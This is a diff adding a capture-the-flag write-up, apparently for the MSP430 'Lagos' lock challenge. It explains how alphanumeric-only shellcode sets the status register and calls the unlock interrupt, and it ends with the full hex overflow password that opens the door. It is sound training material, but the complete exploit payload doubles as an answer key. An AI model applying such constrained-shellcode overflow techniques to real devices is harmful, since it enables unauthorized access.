@@ -1,0 +1,17 @@
+Lagos
+The password can contain alphanumeric characters only. So our shellcode has to be created using only these bytes. There's some information about alphanumeric shellcode on MSP430: https://gist.github.com/rmmh/8515577. There are only indirect jumps, no way to write to memory and not much other useful instructions.
+The goal was to set sr to 0x007f and call interrupt. I couldn't find any instructions to do that easily, so I used this shellcode:
+7a52 add.b #0x8, r10
+(repeated many times to be close to 7f)
+6a52 add.b #0x4, r10
+6a53 add.b #0x2, r10
+5a53 add.b #0x1, r10
+4f4a mov.b r10, r15 
+Then we need a lot of nop instructions so we advance PC enough to call a indirect jump to 4604 at INT:
+7734 jge $+0xf0
+8f10           swpb r15
+024f           mov  r15, sr
+32d0 0080      bis  #0x8000, sr
+b012 1000      call #0x10
+Which unlocks the door.
+Password: 41414141414141414141414141414141413044555542424242424242424242424242424242424242424343434343434343434343434343434343434343434343434343434343434343434343434343434343434343434343437a527a527a527a527a527a527a527a527a527a527a527a527a527a527a526a526a535a534f4a3452345234523452345234523452345234523452345234523452345234523452345234523452345234523452345234523452345234523452345234523452345234523452345234523452345234523452345234523452345234523452345234523452345234523452345234523452345234523452345234523452345234523452345234523452345234523452345234523452345234523452345234523452345234523452345234527734
